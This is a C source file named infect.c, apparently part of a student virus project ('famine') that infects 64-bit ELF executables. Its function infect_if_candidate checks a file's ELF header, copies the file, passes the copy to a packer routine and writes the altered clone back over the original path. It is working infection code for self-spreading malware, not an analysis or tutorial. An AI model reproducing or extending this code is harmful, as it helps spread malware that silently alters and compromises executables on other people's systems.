/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/15 17:29:04 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <linux/elf.h>
#include "infect.h"
#include "syscall.h"
#include "accessors.h"
#include "errors.h"
#include "utils.h"

static bool	elf64_identifier(const Elf64_Ehdr *hdr)
{
	if (ft_memcmp(hdr->e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
	|| hdr->e_ident[EI_CLASS] != ELFCLASS64           // not 64bit
	|| hdr->e_ident[EI_DATA] != ELFDATA2LSB           // not little endian
	|| hdr->e_entry == 0                              // no entry point
	|| hdr->e_phoff == 0                              // no program hdr table
	|| hdr->e_shoff == 0)                             // no section hdr table
		return false;

	return true;
}

inline bool	infect_if_candidate(const char *file)
{
	struct famine	food;
	Elf64_Ehdr	elf64_hdr;
	int		fd = famine_open(file, O_RDONLY);

	if (fd < 0)
	{
		return errors(ERR_SYS, '8','1');
	}
	if (famine_read(fd, &elf64_hdr, sizeof(elf64_hdr)) < (ssize_t)sizeof(elf64_hdr))
	{
		famine_close(fd);
		return errors(ERR_USAGE, '8','2');
	}
	if (!elf64_identifier(&elf64_hdr))
	{
		famine_close(fd);
		return errors(ERR_USAGE, '8','3');
	}

	famine_close(fd);

	if (!original_accessor(&food.original_safe, file))
		return errors(ERR_THROW, '8','5');

	if (!clone_accessor(&food.clone_safe, food.original_safe.filesize))
		return errors(ERR_THROW, '8','6');

	if (!elf64_packer(food, food.original_safe.filesize))
		return errors(ERR_THROW, '8','7');

	write_clone_file(food.clone_safe, file);

	free_accessor(&food.original_safe);
	free_accessor(&food.clone_safe);

	return true;
}
